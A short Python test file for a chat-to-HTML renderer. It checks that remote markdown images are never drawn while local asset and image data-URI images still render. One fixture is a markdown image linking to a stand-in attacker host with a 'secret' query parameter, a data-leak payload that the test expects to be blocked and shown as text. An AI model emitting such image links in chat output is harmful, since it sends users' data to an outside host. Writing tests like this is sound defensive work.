from paper_pile.core.parser import local_image, render_chat_html


def test_remote_images_are_never_drawn() -> None:
    html = render_chat_html(
        "![x](https://evil.example/?d=secret) ![y](//e.com/a.png) ![z](a.png)\n\n"
        "[r]: http://e.com/r.png\n\n![ref][r]"
    )
    assert "<img" not in html
    assert "![x](https://evil.example/?d=secret)" in html  # shown as text instead


def test_the_apps_own_images_still_show() -> None:
    html = render_chat_html("![y](/_pp/asset?p=a.png) ![d](data:image/png;base64,AA)")
    assert html.count("<img") == 2 and 'alt="y"' in html


def test_local_image() -> None:
    assert local_image("/_pp/asset?x") and local_image("data:image/png;base64,A")
    assert not local_image("https://a") and not local_image("//a") and not local_image("a.png")
    assert not local_image("data:text/html,x")
